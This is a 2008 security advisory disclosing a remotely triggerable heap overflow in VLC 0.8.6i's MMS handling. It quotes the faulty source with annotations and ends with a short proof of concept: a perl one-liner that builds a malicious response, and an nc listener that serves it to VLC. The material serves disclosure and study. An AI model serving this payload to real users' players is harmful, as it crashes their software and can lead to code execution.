@@ -1,0 +1,113 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+- - Orange Bat advisory -
+
+Name       	: VLC 0.8.6i MMS Protocol Handling
+Class        	: Heap Overflow
+Published   	: 2008-08-24
+Credit		: g_ (g_ # orange-bat # com)
+
+- - Details -
+
+This can be exploited from remote. User have to open mmst://
+link poiting to server controlled by the attacker.
+
+vlc\modules\access\mms\mmstu.c :
+
+static int mms_ReceiveCommand( access_t *p_access )
+{
+    access_sys_t *p_sys = p_access->p_sys;
+
+    for( ;; )
+    {
+        int i_used;
+        int i_status;
+
+        if( NetFillBuffer( p_access ) < 0 )
+        {
+            msg_Warn( p_access, "cannot fill buffer" );
+            return VLC_EGENERIC;
+        }
+        if( p_sys->i_buffer_tcp > 0 )
+        {
+[1]         i_status = mms_ParseCommand( p_access, p_sys->buffer_tcp,
+                                         p_sys->i_buffer_tcp, &i_used );
+[2]         if( i_used < MMS_BUFFER_SIZE )	
+            {
+[3]             memmove( p_sys->buffer_tcp, p_sys->buffer_tcp + i_used,
+                         MMS_BUFFER_SIZE - i_used );	//BUG! i_used overflow
+
+(...)
+
+[1] - function that sets i_used to negative value, see below
+[2] - i_used is signed, so predicate is true
+[3] - actual overflow, we have good control over what is written
+
+static int  mms_ParseCommand( access_t *p_access,
+                              uint8_t *p_data,
+                              int i_data,
+                              int *pi_used )
+(...)
+    i_length = GetDWLE( p_data + 8 ) + 16;
+(...)
+    if( i_length > p_sys->i_cmd )
+    {
+        msg_Warn( p_access,
+                  "truncated command (missing %d bytes)",
+                   i_length - i_data  );
+        p_sys->i_command = 0;
+        return -1;
+    }
+[1] else if( i_length < p_sys->i_cmd )
+    {
+        p_sys->i_cmd = i_length;
+[2]     *pi_used = i_length;
+    }
+
+(...)
+
+[1] - predicate is true
+[2] - sets i_used from mms_ReceiveCommand
+
+- - Proof of concept -
+
+on localhost:
+
+perl -e 'print "aaaa\xce\xfa\x0b\xb0\xef\xff\xef\xff"; print "a"x100' > headshot
+nc -l -v -p 1755 < headshot 
+
+open this url in VLC:
+
+mmst://127.0.0.1/
+
+boom! headshot :)
+
+- - PGP -
+
+All advisories from Orange Bat are signed. You can find our public
+key here: http://www.orange-bat.com/g_.asc
+
+- - Disclaimer -
+
+This document and all the information it contains is provided "as is",
+without any warranty. Orange Bat is not responsible for the
+misuse of the information provided in this advisory. The advisory is
+provided for educational purposes only.
+
+Permission is hereby granted to redistribute this advisory, providing
+that no changes are made and that the copyright notices and
+disclaimers remain intact.
+
+(c) 2008 www.orange-bat.com 
+
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.9 (MingW32) - GPGshell v3.70
+
+iEYEARECAAYFAkiwgBkACgkQIUHRVUfOLgUKOgCdFOAznbm44YJWiEqaQJK7XaF2
+AuIAnRjabi6RiPT6G/66kxseVG+K0rkj
+=/CN5
+-----END PGP SIGNATURE-----
+
+# milw0rm.com [2008-08-23]
